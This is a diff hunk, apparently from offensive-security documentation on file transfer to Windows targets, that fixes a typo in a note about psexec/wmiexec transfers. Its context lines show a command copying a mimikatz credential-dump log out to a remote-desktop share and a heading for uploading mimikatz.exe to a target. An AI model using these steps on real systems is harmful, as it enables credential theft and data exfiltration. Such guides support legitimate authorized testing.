@@ -66,7 +66,7 @@ copy mimikatz.log \\tsclient\test\mimikatz.log
     `psexec` and `wmiexec` are shipped with built in feature for file transfer.
 
 !!! note
-    By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path.
+    By default whether you upload (lput) or download (lget) a file, it'll be writen in `C:\Windows` path.
 
 Uploading mimikatz.exe to the target machine:
 ```powershell
